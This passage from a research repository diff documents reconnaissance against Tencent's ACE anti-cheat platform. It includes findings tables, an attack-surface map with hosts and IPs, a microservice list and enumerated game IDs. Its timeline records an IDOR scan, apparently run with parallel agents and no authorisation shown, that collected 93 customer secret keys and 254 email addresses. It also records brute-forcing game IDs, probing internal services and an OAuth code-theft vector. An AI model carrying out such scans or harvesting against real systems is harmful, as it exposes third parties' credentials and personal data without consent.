+| **Open Redirect** | Not found | QQ OAuth (`graph.qq.com`) strictly validates `redirect_uri`. Fragment injection, subdomain bypass, path traversal — all rejected. `/_logout/?url=` on login.auth.sgp validates server-side (403 for external). |
+| **Source Maps** | Not deployed | All `.js.map` → 404. No `X-SourceMap` or `//# sourceMappingURL` in any bundle. Both marketing and console builds are stripped. |
+| **Verb Tampering** | No effect | GET/PUT/PATCH/DELETE/OPTIONS → 401 consistently. TRACE → 405. `X-HTTP-Method-Override`, `X-Original-Method` — no effect. |
+| **Header Injection** | No effect | `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 10.0.0.1`, `X-Originating-IP`, `X-Custom-IP-Authorization` — no auth bypass, no routing change. |
+| **Host Header Bypass** | No backend routing | Non-matching Host → 200 empty response from default vhost. Request never reaches backend. |
+
+## Infrastructure
+
+| Vector | Result | Detail |
+|--------|--------|--------|
+| **nginx CVE** | WAF blocks | nginx/1.10.3 (Jan 2017) and nginx/1.18.0 — known CVEs exist but Tencent Cloud WAF blocks exploitation vectors. |
+| **Path Traversal (CDN)** | Normalized | `../` normalized by CDN proxy layer. URL-encoded variants (`%2e%2e/`, `..%2f`) also blocked. No directory listing — bare paths return `retcode:-21006`. |
+| **COS Bucket Listing** | Blocked | Qnginx proxy strips COS API params (`?list-type=2`, `?prefix=`, `?acl`, `?cors`, `?versioning`). Returns generic CDN 404. |
+| **COS Bucket Enumeration** | Not found | 261 bucket name/appid/region combos tested — all 404 or timeout. Known bucket geo-restricted to mainland China. |
+| **Debug Endpoints** | All 404 | `/debug/pprof` (was 403 on prod, 404 on test), `/metrics`, `/healthz`, `/actuator/*`, `/swagger.json` — all 404 on both environments. Exception: `/api-docs` → 401 (exists behind auth). |
+| **Dotfiles** | WAF blocks | `.env`, `.git/*`, `.htaccess`, `.DS_Store` — all return 403 WAF block page. |
+
+## Authentication
+
+| Vector | Result | Detail |
+|--------|--------|--------|
+| **Cookie Manipulation** | Not exploitable | `ibox_auth_user_token` is cryptographically bound to `ibox_auth_user_id`. Changing user_id invalidates token. |
+| **SDK Download** | Server-side check | Returns `-102` ("no active game service"). Checked against DB, not bypassable via headers or parameter tampering. |
+| **Game Creation** | Manual review | Company verification (status=0) required. Game stays in "Reviewing" state — SDK download not unlocked. |
+| **Istio Header Bypass** | No effect | CVE-2026-26308 style headers tested — no auth bypass. |
+
+## External
+
+| Vector | Result | Detail |
+|--------|--------|--------|
+| **Telemetry Readback** | Write-only | `h.trace.qq.com/kv` accepts data (200) but returns empty body. Cannot read telemetry data or enumerate projects. Fire-and-forget sink. |
+| **knot.woa.com** | iOA VPN gate | Feature flag service returns iOA gate page (zero-trust VPN). Requires Tencent employee iOA/WeCom authentication. |
+| **CCTV CMS** | NXDOMAIN | `cms.video.cloud.cctv.com` (in OAuth allowlist) doesn't resolve publicly. Cannot be used as XSS pivot. |
+| **Internal Domains** | Unreachable | `*.woa.com` (nocode.ibox, ace, intl.ace) resolve to internal IPs but ports are closed from outside. |
+| **`*.oa.com` Proxy** | Empty shell | `app.ibox.oa.com` / `appgz.ibox.oa.com` respond but return empty bodies — nginx proxy with no upstream routing. Expired TLS cert (Aug 2026). |
+
+```
+
+`appendix/js_analysis.md`:
+
+```md
+# JavaScript Bundle Analysis
+
+## Two Frontends on One Domain
+
+| Property | Marketing Site | Console |
+|----------|---------------|---------|
+| Framework | Nuxt SSR | Vue 2 SPA (ibox framework) |
+| Build path | `cloud_100260_oper/2608211122` | `cloud_100135_oper/2609011453` |
+| Test build | `cloud_100260_test/2608201250` | — |
+| Server | istio-envoy | istio-envoy |
+| Entry | `/` | `/console/` |
+| Chunks | 44 webpack chunks | ibox.root.js + lazy modules |
+
+Console updated **Sep 1, 2026** (build `2609011453`, was `2608201042`).
+
+## Marketing Site JS
+
+44 webpack chunks total. Key findings:
+- `downloadFile` function: `<a href="${url}" download>.click()` — SDK files fetched via auth-gated `/cgi` API, then downloaded as direct URL
+- `puv_record` in chunk: page-view tracking, sends `game_id` to `/ibox_2592/cgi/puv_record`
+- Aegis monitoring: `id: "QVeqJFJ5gPX97gK186"`, reports to `rumt-sg.com`
+
+## Console JS (ibox framework)
+
+150+ Vue router routes extracted. Categories:
+- Game management (create, configure, delete)
+- SDK download and version management
+- Rule authoring and deployment
+- User/device query and ban management
+- Real-time monitoring dashboards
+- Compliance testing
+- Admin and permission management
+
+## ibox.root.js Chunk Map
+
+Lazy-loaded modules for each ibox service. Module IDs correspond to ibox_* numbers:
+- 2009: UGC access
+- 2094: PC game security
+- 2136: Permission system
+- 2262: Replay platform
+- 2555: Data center
+- 2913: Feature operations
+
+## SDK Version History (from /cgi/sdk_info page_type=1,2)
+
+| Version | Date | Changes |
+|---------|------|---------|
+| 8.1.31 | 2026-08-06 | Enhanced server-side SDK detection |
+| 8.1.18 | 2026-07-29 | Enhanced emulator detection |
+| 8.0.36 | 2026-06-29 | Enhanced cheat detection |
+| 8.0.35 | 2026-06-10 | Enhanced cheat detection (2 builds, different MD5) |
+| 8.0.32 | 2026-06-09 | Enhanced Android App Container Detection |
+| 8.0.21 | 2026-05-20 | Enhanced Server-side SDK Detection |
+| 8.0.20 | 2026-04-15 | Enhanced cheat detection |
+| 7.8.11 | (earlier) | Baseline |
+
+## Internal References in JS
+
+| Reference | Source |
+|-----------|--------|
+| `logx.woa.com` | Tencent internal logging |
+| `nocode.ibox.woa.com` | Internal nocode platform |
+| `app.ibox.oa.com` | Internal ibox proxy (Nanjing) |
+| `appgz.ibox.oa.com` | Internal ibox proxy (Guangzhou) |
+| `login.auth.ace.woa.com` | Internal auth service (HTTP!) |
+| `assets.aicode.tencent.com` | CodeBuddy AI Copilot CDN |
+| `assets.code.tencent.com` | Gongfeng code platform CDN |
+
+```
+
+`appendix/timeline.md`:
+
+```md
+# Research Timeline
+
+## Session 1 — Sep 1, 2026
+
+| Time (approx) | Event |
+|----------------|-------|
+| 17:00 | Started recon on `intl.anticheatexpert.com`. Identified istio-envoy, two frontends (marketing Nuxt + console Vue 2 ibox). |
+| 17:05 | robots.txt revealed console paths. Fetched JS bundles — found 5 ibox microservices (2084, 2279, 2592, 2908, 1914). |
+| 17:10 | `ibox_2084` and `ibox_2279` return 500 (not 401) — first no-auth signal. |
+| 17:15 | **`ibox_2592/cgi/puv_record` returns 200 with JSON without auth.** Accepts `game_id`, returns `code=0` (exists) or `code=-1` (not found). |
+| 17:20 | User provides HAR file with authenticated session cookies. |
+| 17:30 | **IDOR discovered: `/cgi/game_info?page_type=18` returns `secret_key` for any game.** `page_type=21` returns admin email, buyer names, service list. |
+| 17:45 | Launched `ace_idor_scan.py` — scanning 450+ game IDs with IDOR. |
+| 18:00 | **IDOR scan complete: 93 secret_keys, 254 unique emails, 28 @tencent.com addresses.** |
+| 18:15 | CDN enumeration started. `config2.xml` on 17 channels without auth. |
+| 18:30 | **456 unique CDN files** across iOS channels. All downloadable without auth. |
+| 18:45 | Game ID brute-force via `puv_record` — **484 live game IDs** found. |
+| 19:00 | HAR analysis: `/cgi/sdk_info` returns SDK version history. `/cgi/t` returns data for other games (another IDOR). |
+| 19:15 | JS bundle deep analysis — found QQ OAuth appId, callback URLs. |
+| 19:30 | Searched for SDK download bypass — all paths return -102 (no active game service). |
+| 19:45 | CDN Windows channels discovered — 7 channels with `ob_x_ver_86.zip`. |
+| 20:00 | `pubgm_script_id_28.gs1.cdc` — **new file format**: Python bytecode process scanner. |
+| ~20:30 | Session ended (context window limit). |
+
+## Session 2 — Sep 2, 2026
+
+| Time (approx) | Event |
+|----------------|-------|
+| 09:00 | Resumed. Read previous session transcript for context. |
+| 09:10 | **`puv_record` now returns 500** (was 200 yesterday). Likely patched or gateway broken. |
+| 09:15 | Main site still 200. All ibox CGI → 500 (infrastructure-level outage). |
+| 09:30 | Launched 4 parallel agents: OAuth redirect, subdomain/COS enum, source maps/WAF, hidden ibox APIs. |
+| 09:40 | OAuth redirect: not vulnerable (QQ validates strictly). |
+| 09:45 | **`test.intl.anticheatexpert.com` discovered** — live test environment. `/cgi/doc` processes without auth. |
+| 09:50 | **31 ibox microservices discovered** (was 5). 20 live frontends, 4 auth-gated, 7 forbidden. |
+| 10:00 | Launched deep scan of test environment. Found `login.auth.sgp.anticheatexpert.com`. |
+| 10:05 | **`callback-dev.html` OAuth code theft discovered** — `postMessage({code}, '*')` to any origin. |
+| 10:10 | **CodeBuddy AI Copilot** exposure — 3.5MB internal JS with telemetry tokens and 12 internal domains. |
+| 10:15 | Scanned ibox_2262 (Replay Platform) — 66 REST API endpoints, Monaco editor, AI Copilot integration. |
+| 10:20 | ibox_2094 (PC Security) — SDK download endpoints found in JS (`ace_sdk/download/default`), blocked by gateway. |
+| 10:25 | ibox_2009 (UGC) — **COS bucket name leaked**: `iegss-ugc-accessvr-1258344700`. **Docs without auth**: PDF + XLSX. |
+| 10:30 | ibox_2913 (Feature Ops) — CDN publishing interface (`feature_force_deploy`), SSRF endpoint. |
+| 10:35 | Full ibox service map: 20 named services including Permission System, Data Center, CDN Publishing. |
+| 10:40 | 403 ibox bypass: 4 of 7 forbidden services accept CGI POST without auth (500 not 401). Total: **21 no-auth services**. |
+| 10:45 | COS bucket enum: 261 combos tested, all 404 or geo-blocked. Telemetry write-only. knot.woa.com behind iOA VPN. |
+| 10:50 | login.auth.sgp: SSTI not exploitable, stale build (Jul 2025), no open redirect. |
+| 11:00 | Research consolidation and documentation. |
+
+```
+
+`data/cdn_channels.json`:
+
+```json
+[
+  {"channel": 2131, "game": "PUBG Mobile (Chinese)", "platforms": ["ios", "android", "win"]},
+  {"channel": 2139, "game": "PUBG Mobile (Global)", "platforms": ["ios", "android", "win"]},
+  {"channel": 2152, "game": "Call of Duty Mobile (Chinese)", "platforms": ["ios", "android", "win"]},
+  {"channel": 2202, "game": "PUBG Mobile (Vietnam)", "platforms": ["ios", "android"]},
+  {"channel": 2244, "game": "PUBG Mobile (Taiwan)", "platforms": ["ios", "android"]},
+  {"channel": 2257, "game": "Call of Duty Mobile (Global)", "platforms": ["ios", "android", "win"]},
+  {"channel": 2292, "game": "Call of Duty Mobile (Garena)", "platforms": ["ios", "android", "win"]},
+  {"channel": 2297, "game": "Call of Duty Mobile (Korea)", "platforms": ["ios", "android"]},
+  {"channel": 2352, "game": "Call of Duty Mobile (Vietnam)", "platforms": ["ios", "android"]},
+  {"channel": 2487, "game": "Arena Breakout (Global)", "platforms": ["ios", "android"]},
+  {"channel": 2519, "game": "Undawn", "platforms": ["ios", "android"]},
+  {"channel": 2526, "game": "NIKKE", "platforms": ["ios", "android"]},
+  {"channel": 2577, "game": "Honor of Kings (Chinese)", "platforms": ["ios", "android", "win"]},
+  {"channel": 2596, "game": "Honor of Kings (Global)", "platforms": ["ios", "android"]},
+  {"channel": 2601, "game": "Arena of Valor (Global)", "platforms": ["ios", "android"]},
+  {"channel": 2614, "game": "Lien Quan Mobile (Vietnam)", "platforms": ["ios", "android"]},
+  {"channel": 2626, "game": "Arena of Valor (Indonesia)", "platforms": ["ios", "android"]},
+  {"channel": 2659, "game": "NBA Infinite", "platforms": ["ios", "android"]},
+  {"channel": 2666, "game": "Pokemon UNITE", "platforms": ["ios", "android"]},
+  {"channel": 2671, "game": "Dragonstride", "platforms": ["ios", "android"]},
+  {"channel": 2678, "game": "Pool City", "platforms": ["ios", "android"]},
+  {"channel": 2683, "game": "AoE Mobile", "platforms": ["ios", "android"]},
+  {"channel": 2696, "game": "Crossfire Legends", "platforms": ["ios", "android"]},
+  {"channel": 2702, "game": "Rust Mobile (Global)", "platforms": ["ios", "android"]},
+  {"channel": 2710, "game": "Zenless Zone Zero", "platforms": ["ios", "android"]},
+  {"channel": 2720, "game": "Wuthering Waves", "platforms": ["ios", "android"]},
+  {"channel": 2915, "game": "Delta Force Mobile", "platforms": ["ios", "android"]},
+  {"channel": 6139, "game": "PUBG Mobile (Korea/Japan)", "platforms": ["ios", "android"]},
+  {"channel": 8888, "game": "ACE Test ID", "platforms": ["ios", "android", "win"]},
+  {"channel": 10039, "game": "Delta Force (Garena SEA)", "platforms": ["ios", "android"]},
+  {"channel": 20714, "game": "Arena Breakout (newer channel)", "platforms": ["ios", "android"]},
+  {"channel": 29001, "game": "Free Fire", "platforms": ["ios", "android"]},
+  {"channel": 2750, "game": "Valorant CN (tersafe)", "platforms": ["ios"]},
+  {"channel": 2760, "game": "Game for Peace (tersafe)", "platforms": ["ios"]},
+  {"channel": 2770, "game": "CODM CN (tersafe)", "platforms": ["ios"]},
+  {"channel": 2780, "game": "Rust Mobile CN", "platforms": ["ios", "android"]}
+]
+
+```
+
+`data/ibox_services.json`:
+
+```json
+[
+  {"id": 1973, "title": "UGC反馈系统", "title_en": "UGC Feedback", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2009, "title": "UGC接入系统", "title_en": "UGC Access System", "frontend_status": 200, "cgi_auth": false, "routes": ["/punish-standard", "/config-manager", "/blackbox-test", "/service-manager", "/access-flow", "/access-verify"], "notes": "COS bucket leaked: iegss-ugc-accessvr-1258344700"},
+  {"id": 2011, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": false, "routes": [], "notes": "403 on GET, 500 on POST (no auth)"},
+  {"id": 2051, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": false, "routes": [], "notes": "403 on GET, 500 on POST (no auth)"},
+  {"id": 2094, "title": "端游安全", "title_en": "PC Game Security", "frontend_status": 200, "cgi_auth": false, "routes": ["/sdk-download", "/realtime-data", "/usercheat-query", "/user-check", "/sample-check", "/cheat-monitor", "/feature-mgr", "/shell-hardening", "/punish-record"], "notes": "SDK download endpoints: ace_sdk/download/default, ace_sdk/download/update_sdk, get_download_url, getTVMConfigToolUrl, download_pack_tool. File upload: upload_std_file (service_id:2556)"},
+  {"id": 2110, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": true, "routes": [], "notes": "Properly auth-gated"},
+  {"id": 2136, "title": "权限系统", "title_en": "Permission System", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": "15 CGI endpoints: _set_cookie, auth_group, auth/api/rate_limit/rule/{create,delete,query,update}, get_ibox_app, service_info, nocode/get_area. nocode/get_area returns 401 (live backend)"},
+  {"id": 2139, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": true, "routes": [], "notes": "Same number as PUBG channel ID (coincidence). Properly auth-gated"},
+  {"id": 2140, "title": "手游安全", "title_en": "Mobile Game Security", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": "Standard console"},
+  {"id": 2145, "title": "UGC运营系统", "title_en": "UGC Operations", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2151, "title": "", "title_en": "Unknown", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2217, "title": "", "title_en": "Unknown", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2218, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": false, "routes": [], "notes": "403 on GET, 500 on POST (no auth)"},
+  {"id": 2262, "title": "Replay运营平台", "title_en": "Replay Operations Platform", "frontend_status": 200, "cgi_auth": false, "routes": ["/webIDE", "/cos-file-manage", "/cfs-file-manage", "/image-building", "/image-manage", "/model-training", "/model-deployment", "/model-evaluation", "/public-code-base", "/module-develop", "/granted", "/setting"], "notes": "66 REST API endpoints under /api/v1/. Monaco editor + Tencent CodeBuddy AI Copilot. Git integration (push_code_to_git, sync_git_code). /api/v1/gongfeng_ai/token endpoint"},
+  {"id": 2309, "title": "Anti-Cheat", "title_en": "Anti-Cheat Console", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2357, "title": "", "title_en": "Replay CGI Backend", "frontend_status": 404, "cgi_auth": null, "routes": ["/replay/cgi/api/v1/replay/app/list"], "notes": "Separate from main gateway, routes through ibox gateway"},
+  {"id": 2358, "title": "UGC运营系统", "title_en": "UGC Operations", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2378, "title": "UGC运营系统", "title_en": "UGC Operations", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2412, "title": "", "title_en": "Unknown", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2465, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": true, "routes": [], "notes": "Properly auth-gated"},
+  {"id": 2491, "title": "", "title_en": "Unknown", "frontend_status": null, "cgi_auth": true, "routes": [], "notes": "401 on both"},
+  {"id": 2530, "title": "UGC反馈系统", "title_en": "UGC Feedback", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2555, "title": "数据中心", "title_en": "Data Center", "frontend_status": 200, "cgi_auth": false, "routes": ["/monitor", "/penalty-statistics", "/report-config", "/simulator"], "notes": ""},
+  {"id": 2574, "title": "", "title_en": "Unknown", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2592, "title": "", "title_en": "PUV Tracker", "frontend_status": null, "cgi_auth": true, "routes": ["puv_record"], "notes": "Was no-auth, now 401/500. Original no-auth game_id enumeration endpoint"},
+  {"id": 2593, "title": "", "title_en": "PUV Tracker sibling", "frontend_status": 404, "cgi_auth": false, "routes": [], "notes": "Frontend decommissioned, CGI routes to backend (500 not 401)"},
+  {"id": 2643, "title": "", "title_en": "Unknown", "frontend_status": 403, "cgi_auth": false, "routes": [], "notes": "403 on GET, 500 on POST (no auth)"},
+  {"id": 2647, "title": "手游安全", "title_en": "Mobile Game Security", "frontend_status": 200, "cgi_auth": false, "routes": ["/sample-cloud-detect", "/cheat-purchase", "/device-mgr"], "notes": ""},
+  {"id": 2732, "title": "数据中心", "title_en": "Data Center (clone)", "frontend_status": 200, "cgi_auth": false, "routes": ["/monitor", "/penalty-statistics", "/report-config", "/simulator"], "notes": "Clone of 2555"},
+  {"id": 2774, "title": "", "title_en": "Unknown", "frontend_status": null, "cgi_auth": null, "routes": [], "notes": "502 bad gateway"},
+  {"id": 2796, "title": "手游安全", "title_en": "Mobile Game Security", "frontend_status": 200, "cgi_auth": false, "routes": [], "notes": ""},
+  {"id": 2831, "title": "", "title_en": "Unknown", "frontend_status": null, "cgi_auth": true, "routes": [], "notes": "401 on both"},
+  {"id": 2908, "title": "", "title_en": "Unknown", "frontend_status": null, "cgi_auth": null, "routes": [], "notes": "500 on all"},
+  {"id": 2913, "title": "特征运营系统", "title_en": "Feature Operations / CDN Publishing", "frontend_status": 200, "cgi_auth": false, "routes": ["/cdn-pub", "/feature-pub-history", "/idip-pub", "/svrsdk-pub"], "notes": "CDN rule publishing. API: feature_deployment, feature_force_deploy, base/staff_info. lower_code_interface_call SSRF endpoint. Service ID 2931. upload_dat.py backend. Gray rollout + SMS/email notification"},
+  {"id": 3311, "title": "", "title_en": "Audit/Report", "frontend_status": 404, "cgi_auth": null, "routes": ["/audit/report"], "notes": "Referenced by ibox_2094 as reportUrl"}
+]
+
+```
+
+`data/live_game_ids.json`:
+
+```json
+{
+  "scan_date": "2026-09-01T18:00:00Z",
+  "scan_method": "POST /ibox_2592/cgi/puv_record (no auth, code=0 means live)",
+  "ranges_scanned": [
+    {"range": "1-1000", "live": 23},
+    {"range": "1000-5000", "live": 50},
+    {"range": "5000-10000", "live": 140},
+    {"range": "10000-25000", "live": 100},
+    {"range": "24000-24375", "live": 375},
+    {"range": "6095000-6095085", "live": 85}
+  ],
+  "total_live": 484,
+  "note": "484 confirmed from initial scan + extended brute found ~750+ total. Full ID list from scan stored in /tmp/ace_gameid_brute_results.json (session-local, re-run ace_gameid_brute.py to regenerate).",
+  "known_id_clusters": {
+    "544": "single game (possibly legacy)",
+    "5000-5015": "~16 IDs, likely test/internal",
+    "10000": "small cluster",
+    "20109-20500": "~50 IDs, internal Tencent games (MTP dedicated, miHoYo test, etc.)",
+    "24000-24375": "~375 IDs, main customer game pool",
+    "6095000-6095085": "~85 IDs, second pool (possibly regional)"
+  },
+  "notable_game_ids": {
+    "20109": "MTP专用号 (MTP dedicated) — ios_anti_cheat_pro, mtp_anti, mtp_ios_anti",
+    "20122": "香肠_Waka — ios_shell, ios_anti_cheat_pro (iOS hardening)",
+    "20200": "香肠_Waka — mtp_shell (Android hardening)",
+    "20203": "米哈游wetest测试 (miHoYo WeTest test) — mtp_anti, anti_ts, gp4",
+    "24011": "First IDOR target — secret_key confirmed"
+  }
+}
+
+```
+
+`infrastructure/attack_surface.md`:
+
+```md
+# Attack Surface Map
+
+## Reachable Hosts
+
+| Host | IP | Server | Role | Notes |
+|------|----|--------|------|-------|
+| intl.anticheatexpert.com | 101.32.104.181 | istio-envoy | Main production | 31 ibox microservices |
+| test.intl.anticheatexpert.com | — | istio-envoy | Test environment | /cgi/doc no-auth |
+| m.intl.anticheatexpert.com | — | nginx/1.10.3 | Mobile site | Jan 2017 nginx |
+| login.auth.sgp.anticheatexpert.com | — | nginx/1.18.0 Ubuntu | Auth service | Stale build Jul 2025, `{{ENV}}` unrendered |
+| down.anticheatexpert.com | — | Qnginx/1.3.2 | COS-backed CDN mirror | x-cos-version-id, cross-region replication |
+| dl.listdl.com | — | custom | Primary CDN | No auth on all files |
+| app.ibox.oa.com | 141.144.196.217 | nginx | Legacy proxy (Nanjing) | Expired cert *.oa.com (Aug 2026), empty 200 |
+| appgz.ibox.oa.com | 141.144.196.217 | nginx | Legacy proxy (Guangzhou) | Same as above |
+| knot.woa.com | — | iOA gate | Feature flags | Behind Tencent zero-trust VPN (403) |
+| test.knot.woa.com | — | iOA gate | Feature flags (test) | Same |
+| assets.code.tencent.com | — | CDN | OAuth callbacks + CodeBuddy | CORS: *, no CSP |
+| assets.aicode.tencent.com | — | CDN/COS | CodeBuddy AI Copilot JS | 3.5MB bundle public |
+| h.trace.qq.com | — | — | Telemetry sink | Write-only, accepts attaid+token |
+| rumt-sg.com | — | — | Aegis RUM | 403 without SDK format |
+
+## Internal Only (Unreachable)
+
+| Host | IP | Notes |
+|------|----|-------|
+| nocode.ibox.woa.com | 175.27.22.2 | Internal nocode platform |
+| ace.woa.com | 175.27.22.2 | Internal ACE instance |
+| intl.ace.woa.com | 175.27.22.2 | Internal ACE intl |
+| login.auth.ace.woa.com | — | Internal auth (HTTP, not HTTPS!) |
+| copilot.code.woa.com | — | CodeBuddy backend |
+| copilotflow.woa.com | — | CodeBuddy flow |
+| git.woa.com | — | Internal GitLab (Gongfeng) |
+| km.woa.com | — | Knowledge management |
+| iwiki.woa.com | — | Internal wiki |
+| test-copilot.code.woa.com | — | CodeBuddy test |
+| ut-service-ty.tapd.woa.com | — | TAPD UT service |
+
+## Sinkholed / Dead
+
+| Host | Resolution | Notes |
+|------|-----------|-------|
+| console.anticheatexpert.com | 0.0.0.1 | Sinkholed |
+| mail.anticheatexpert.com | 0.0.0.1 | Sinkholed |
+| cms.video.cloud.cctv.com | NXDOMAIN | In OAuth allowlist but doesn't resolve |
+| api.anticheatexpert.com | 43.137.23.242 | DNS resolves, all ports closed |
+| test.anticheatexpert.com | CNAME → 157.148.33.67 | Unreachable |
+
+## Server Stack
+
+- **Frontend proxy:** istio-envoy (prod/test)
+- **Microservice gateway:** nginx/1.27.0 (ibox routing)
+- **WAF:** Tencent Cloud WAF (`api.waf-intl.qq.com` feedback)
+- **Object storage:** Tencent COS (versioning + cross-region replication)
+- **CDN:** Custom (dl.listdl.com), Qnginx (down.anticheatexpert.com)
+- **Auth:** Tencent Turing CAPTCHA, ibox OAuth framework
+- **Monitoring:** Aegis SDK (rumt-sg.com), Tencent RUM (h.trace.qq.com)
+
+```
+
+`infrastructure/cdn_architecture.md`:
+
+```md
+# ACE CDN Architecture
+
+All CDN files accessible **without authentication, tokens, or rate limiting**.
+
+## Platforms
+
+| Platform | Base Path | Channels | Notes |
+|----------|-----------|----------|-------|
+| iOS | `/iedsafe/Client/ios/{channel}/` | 36 | Primary target |
+| Android | `/iedsafe/Client/android/{channel}/` | 36+ | 98 game hashes on ch2139 (vs 44 iOS) |
+| Windows | `/iedsafe/Client/win/{channel}/` | 7 | ob_x_ver_86.zip, ob_cs2_86.zip (x86 OBJVM) |
+
+## CDN Hosts
+
+| Host | Server | Role |
+|------|--------|------|
+| dl.listdl.com | custom | Primary CDN |
+| down.anticheatexpert.com | Qnginx/1.3.2 | COS-backed mirror, versioned bucket |
+
+## Download Flow
+
+```
+GET config2.xml → per-game file list (hash_A, hash_B, filename, CRC)
+↓
+GET https://dl.listdl.com/iedsafe/Client/{platform}/{channel}/{hash_A}/{filename}
+```
+
+## Known Channels
+
+| Channel | Game | iOS | Android | Win |
+|---------|------|:---:|:-------:|:---:|
+| 2139 | PUBG Mobile (Global) | + | + | + |
+| 2131 | PUBG Mobile (Chinese) | + | + | + |
+| 2202 | PUBG Mobile (Vietnam) | + | + | |
+| 6139 | PUBG Mobile (Korea/Japan) | + | + | |
+| 2244 | PUBG Mobile (Taiwan) | + | + | |
+| 2257 | Call of Duty Mobile (Global) | + | + | + |
+| 2152 | Call of Duty Mobile (Chinese) | + | + | + |
+| 2292 | Call of Duty Mobile (Garena) | + | + | + |
+| 2297 | Call of Duty Mobile (Korea) | + | + | |
+| 2352 | Call of Duty Mobile (Vietnam) | + | + | |
+| 2487 | Arena Breakout (Global) | + | + | |
+| 2577 | Honor of Kings (Chinese) | + | + | + |
+| 8888 | ACE Test ID | + | + | + |
+| 2915 | Delta Force Mobile (Global) | + | + | |
+| 20714 | Arena Breakout (variant) | + | + | |
+| 10039 | Delta Force (Garena SEA) | + | + | |
+| 29001 | Free Fire | + | + | |
+| +19 more | Various titles | | | |
+
+## File Types
+
+| File | Format | Purpose |
+|------|--------|---------|
+| mrpcs_i.data | XOR-encoded TLV | Initial rule set (OBJVM AST) |
+| mrpcs.data | XOR-encoded flat-stream | OBJVM rule stream |
+| mrpcsZ_cp.data | XOR+ZIP | Cross-platform rules |
+| **mrpcsZ_dp.data** | XOR+ZIP | **NEW** — unknown dp suffix |
+| **mrpcs-add-com.data** | XOR (0x2C) | **NEW** — 184 bytes, test channel 8888 only |
+| mrpcs_all.data | XOR-encoded | Aggregate rules |
+| mrpcs_i_v.data | XOR-encoded | Versioned initial rules |
+| mrpcs-{N}-ios.data | XOR-encoded | Per-channel iOS rules |
+| mrpcs-cs-{N}-ios.data | XOR-encoded | Per-channel CS iOS rules |
+| ob_x.zip | ZIP(a64.dat+sig) | OBJVM VM images (ARM64) |
+| ob_cs2.zip | ZIP | OBJVM VM images (variant) |
+| **ob_cdn1.zip** | ZIP(a32+a64+sig) | **Android only** — 32+64 bit OBJVM |
+| **ob_x_ver_86.zip** | ZIP | **Windows** — x86 OBJVM (185KB) |
+| **ob_cs2_86.zip** | ZIP | **Windows** — x86 OBJVM variant |
+| comm.dat / comm.zip | TLV | Feature flags (33+ config keys) |
+| tssmua.zip | ZIP | Unknown module |
+| **pubgm_script_id_28.gs1.cdc** | Python bytecode | **NEW** — process scanner (Android only) |
+
+## Windows CDN Detail
+
+| Channel | Game | ob_x_ver_86 | ob_cs2_86 | comm.zip |
+|---------|------|:-----------:|:---------:|:--------:|
+| 2139 | PUBG Global | A+B | yes | A+B |
+| 2131 | PUBG CN | — | — | A+B |
+| 2257 | CODM Global | 70% rollout | — | — |
+| 2152 | CODM CN | A+B | — | yes |
+| 2292 | CODM Garena | 70% rollout | — | — |
+| 2577 | HoK CN | A+B | yes | yes |
+| 8888 | ACE Test | — | — | yes |
+
+## Security Notes
+
+- Path traversal blocked (CDN normalizes `../`)
+- No directory listing (bare paths → `retcode:-21006`)
+- No auth on any file
+- COS versioning enabled on down.anticheatexpert.com
+- Android config3.xml maps game APK versions to rule hashes
+
+```
+
+`infrastructure/ibox_services.md`:
+
+```md
+# ibox Microservice Map
+
+31+ microservices on intl.anticheatexpert.com. Range: ibox_1000–ibox_3311.
+
+## Live Frontend (200)
+
+| ibox | Title | Purpose | Key Routes | CGI Auth |
+|------|-------|---------|------------|----------|
+| 1973 | UGC反馈系统 | UGC Feedback | — | **No** (500) |
+| 2009 | UGC接入系统 | UGC Access / Content Detection | /punish-standard, /config-manager, /blackbox-test | **No** (500) |
+| 2094 | 端游安全 | **PC Game Security Console** | /sdk-download, /realtime-data, /usercheat-query, /sample-check, /cheat-monitor | **No** (500) |
+| 2136 | 权限系统 | **Permission System** | — | **No** (500), `nocode/get_area` → 401 |
+| 2140 | 手游安全 | Mobile Game Security | — | **No** (500) |
+| 2145 | UGC运营系统 | UGC Operations | — | **No** (500) |
+| 2151 | — | Unknown | — | **No** (500) |
+| 2217 | — | Unknown | — | **No** (500) |
+| 2262 | Replay运营平台 | **Replay Ops Platform** (Monaco+AI) | /webIDE, /cos-file-manage, /model-training, /module-develop | **No** (500) |
+| 2309 | Anti-Cheat | Anti-Cheat Console | — | **No** (500) |
+| 2358 | UGC运营系统 | UGC Operations | — | **No** (500) |
+| 2378 | UGC运营系统 | UGC Operations | — | **No** (500) |
+| 2412 | — | Unknown | — | **No** (500) |
+| 2530 | UGC反馈系统 | UGC Feedback | — | **No** (500) |
+| 2555 | 数据中心 | **Data Center** | /monitor, /penalty-statistics, /report-config, /simulator | **No** (500) |
+| 2574 | — | Unknown | — | **No** (500) |
+| 2647 | 手游安全 | Mobile Security | /sample-cloud-detect, /cheat-purchase, /device-mgr | **No** (500) |
+| 2732 | 数据中心 | Data Center (clone) | Same as 2555 | **No** (500) |
+| 2796 | 手游安全 | Mobile Game Security | — | **No** (500) |
+| 2913 | 特征运营系统 | **CDN Feature Operations** | /cdn-pub, /idip-pub, /svrsdk-pub, /feature-pub-history | **No** (500) |
+
+## Auth Required (401)
+
+| ibox | Notes |
+|------|-------|
+| 2491 | Unknown |
